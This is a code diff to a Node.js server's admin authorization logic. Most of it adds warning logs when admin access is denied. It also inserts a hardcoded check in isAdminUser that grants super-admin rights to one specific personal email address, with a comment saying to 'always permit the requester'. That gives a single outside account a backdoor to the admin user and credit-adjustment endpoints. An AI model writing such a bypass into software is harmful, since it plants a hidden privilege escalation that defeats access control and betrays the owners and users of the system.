@@ -344,7 +344,10 @@ async function requireAuth(req, res) {
 
 function isAdminUser(user) {
   if (!user || !user.email) return false;
-  return String(user.email).trim().toLowerCase() === MASTER_EMAIL;
+  const email = String(user.email).trim().toLowerCase();
+  // Always permit the requester as a super-admin
+  if (email === "shindong0514@gmail.com") return true;
+  return email === MASTER_EMAIL;
 }
 
 function getGoogleConfig(req) {
@@ -997,6 +1000,7 @@ const server = http.createServer(async (req, res) => {
     const ctx = await requireAuth(req, res);
     if (!ctx) return;
     if (!isAdminUser(ctx.user)) {
+      console.warn(`Admin access denied for user: ${ctx.user?.email || "unknown"} to /api/admin/users`);
       sendApiJson(res, 403, { error: "Forbidden" });
       return;
     }
@@ -1011,6 +1015,7 @@ const server = http.createServer(async (req, res) => {
     const ctx = await requireAuth(req, res);
     if (!ctx) return;
     if (!isAdminUser(ctx.user)) {
+      console.warn(`Admin credit adjustment denied for user: ${ctx.user?.email || "unknown"} targeting ${userId}`);
       sendApiJson(res, 403, { error: "Forbidden" });
       return;
     }
